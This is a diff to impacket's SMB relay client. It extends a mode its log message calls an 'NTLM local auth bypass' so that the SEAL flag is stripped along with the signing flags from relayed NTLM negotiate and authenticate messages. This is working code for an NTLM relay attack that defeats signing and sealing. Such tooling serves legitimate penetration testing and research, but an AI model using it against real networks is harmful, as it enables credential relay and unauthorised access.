@@ -41,7 +41,7 @@ from impacket.smb3 import SMB3, SMB2_GLOBAL_CAP_ENCRYPTION, SMB2_DIALECT_WILDCAR
     SMB3Packet, SMB2_GLOBAL_CAP_LARGE_MTU, SMB2_GLOBAL_CAP_DIRECTORY_LEASING, SMB2_GLOBAL_CAP_MULTI_CHANNEL, \
     SMB2_GLOBAL_CAP_PERSISTENT_HANDLES, SMB2_NEGOTIATE_SIGNING_REQUIRED, SMB2Packet,SMB2SessionSetup, SMB2_SESSION_SETUP, STATUS_MORE_PROCESSING_REQUIRED, SMB2SessionSetup_Response
 from impacket.smbconnection import SMBConnection, SMB_DIALECT
-from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION
+from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION, NTLMSSP_NEGOTIATE_SEAL
 from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
 from impacket.dcerpc.v5.transport import SMBTransport
 from impacket.dcerpc.v5 import scmr
@@ -332,11 +332,13 @@ class SMBRelayClient(ProtocolClient):
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
         elif self.serverConfig.remove_mic_partial:
             LOG.debug('[SMB] sendNegotiate: Using --remove-mic-partial mode (NTLM local auth bypass)')
-            # Only remove signing flags, keep KEY_EXCH and VERSION
+            # Remove signing and sealing flags, keep KEY_EXCH and VERSION
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
 
         LOG.debug('[SMB] sendNegotiate: Modified NTLM flags: 0x%x' % negoMessage['flags'])
         negotiateMessage = negoMessage.getData()
@@ -543,6 +545,8 @@ class SMBRelayClient(ProtocolClient):
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
             # Do NOT remove KEY_EXCH or VERSION flags
             # Do NOT zero out MIC or Version fields - keep NTLM3 message intact
 
